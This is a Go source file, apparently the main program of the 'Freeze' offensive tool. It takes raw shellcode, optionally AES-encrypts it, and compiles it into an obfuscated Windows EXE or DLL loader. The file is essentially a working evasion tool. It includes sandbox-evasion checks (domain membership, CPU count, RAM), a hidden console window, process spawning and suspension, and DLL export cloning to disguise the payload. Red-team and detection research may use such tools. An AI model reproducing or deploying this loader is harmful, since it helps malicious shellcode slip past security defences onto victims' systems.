package main

import (
	"Freeze/Loader"
	"Freeze/Utils"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
)

type FlagOptions struct {
	outFile   string
	inputFile string
	console   bool
	sandbox   bool
	Sha       bool
	process   string
	export    string
	encrypt   bool
}

func options() *FlagOptions {
	outFile := flag.String("O", "", "Name of output file (e.g. loader.exe or loader.dll). Depending on what file extension defined will determine if Freeze makes a dll or exe.")
	inputFile := flag.String("I", "", "Path to the raw 64-bit shellcode.")
	console := flag.Bool("console", false, "Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.")
	Sha := flag.Bool("sha256", false, "Provides the SHA256 value of the loaders (This is useful for tracking)")
	process := flag.String("process", "notepad.exe", "The name of process to spawn. This process has to exist in C:\\Windows\\System32\\. Example 'notepad.exe'")
	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion by checking:
	Is Endpoint joined to a domain?
	Does the Endpoint have more than 2 CPUs?
	Does the Endpoint have more than 4 gigs of RAM?`)
	encrypt := flag.Bool("encrypt", false, "Encrypts the shellcode using AES 256 encryption")
	export := flag.String("export", "", "For DLL Loaders Only - Specify comma separated Export functions for a loader to have or supply a given DLL file for cloning its Export functions.")
	flag.Parse()
	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, console: *console, Sha: *Sha, sandbox: *sandbox, process: *process, export: *export, encrypt: *encrypt}
}

func execute(opt *FlagOptions, name string, mode string) {
	bin, _ := exec.LookPath("env")
	var compiledname string
	var cmd *exec.Cmd
	if mode == "dll" {
		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "../.lib/garble", "-seed=random", "-literals", "build", "-o", ""+name+"", "-buildmode=c-shared")
	} else {
		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "../.lib/garble", "-literals", "-seed=random", "build", "-o", ""+name)
	}
	fmt.Println("[*] Compiling Payload")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("%s: %s\n", err, stderr.String())
	}
	os.Chdir("..")
	os.Rename(name+"fldr/"+name, name)
	os.RemoveAll(name + "fldr/")
	fmt.Println("[+] Payload " + name + " Compiled")

	if opt.Sha == true {
		Utils.Sha256(compiledname)
	}
}

func main() {
	fmt.Println(` 
	___________                                    
	\_   _____/______   ____   ____ ________ ____  
	 |    __) \_  __ \_/ __ \_/ __ \\___   // __ \ 
	 |     \   |  | \/\  ___/\  ___/ /    /\  ___/ 
	 \___  /   |__|    \___  >\___  >_____ \\___  >
	     \/                \/     \/      \/    \/ 
		 			(@Tyl0us)
	Soon they will learn that revenge is a dish... best served COLD...				
		 `)
	Utils.Version()
	opt := options()

	if opt.inputFile == "" {
		log.Fatal("Error: Please provide a path to a file containing raw 64-bit shellcode (i.e .bin files)")
	}

	if strings.HasSuffix(opt.outFile, "dll") == false && opt.export != "" {
		log.Fatal("Error: Export option can only be used with DLL loaders ")
	}

	if strings.HasSuffix(opt.outFile, "exe") == false && strings.HasSuffix(opt.outFile, "dll") == false {
		log.Fatal("Error: Bad file extension")
	}
	Utils.CheckGarble()
	var mode string
	var rawbyte []byte
	var b64ciphertext, b64key, b64iv string
	src, _ := ioutil.ReadFile(opt.inputFile)
	if opt.encrypt == true {
		dst := make([]byte, hex.EncodedLen(len(src)))
		hex.Encode(dst, src)
		r := base64.StdEncoding.EncodeToString(dst)
		rawbyte = []byte(r)
		key := Utils.RandomBuffer(32)
		iv := Utils.RandomBuffer(16)

		block, err := aes.NewCipher(key)
		if err != nil {
			log.Fatal(err)
		}
		paddedInput, err := Utils.Pkcs7Pad([]byte(rawbyte), aes.BlockSize)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("[*] Encrypting Shellcode Using AES Encryption")
		cipherText := make([]byte, len(paddedInput))
		ciphermode := cipher.NewCBCEncrypter(block, iv)
		ciphermode.CryptBlocks(cipherText, paddedInput)
		b64ciphertext = base64.StdEncoding.EncodeToString(cipherText)
		b64key = base64.StdEncoding.EncodeToString(key)
		b64iv = base64.StdEncoding.EncodeToString(iv)
		fmt.Println("[+] Shellcode Encrypted")
	}
	shellcodeencoded := hex.EncodeToString(src)

	if strings.HasSuffix(opt.outFile, "dll") == true {
		mode = "dll"
	} else {
		mode = ".exe"
	}
	// Default DLL exports
	var exports = []string{"DllRegisterServer", "DllGetClassObject", "DllUnregisterServer"}
	if opt.export != "" {
		if strings.HasSuffix(opt.export, ".dll") {
			var err error
			exports, err = Utils.ExportsFromFile(opt.export)
			if err != nil {
				log.Fatal("Error: Could not get Export table from given DLL file")
			}
			fmt.Println("[!] Added additional Export functions from parsed DLL file: " + opt.export)
		} else if strings.Contains(opt.export, ",") {
			exports = strings.Split(strings.ReplaceAll(opt.export, " ", ""), ",")
			fmt.Println("[!] Added additional Export functions from given list: " + opt.export)
		} else {
			exports = []string{opt.export}
			fmt.Println("[!] Added an additional Export function called: " + opt.export)
		}
	}

	fmt.Println("[!] Selected Process to Suspend: " + opt.process)
	name := Loader.CompileFile(shellcodeencoded, b64ciphertext, b64key, b64iv, opt.outFile, opt.console, mode, exports, opt.sandbox, opt.process, opt.encrypt)
	execute(opt, name, mode)

}
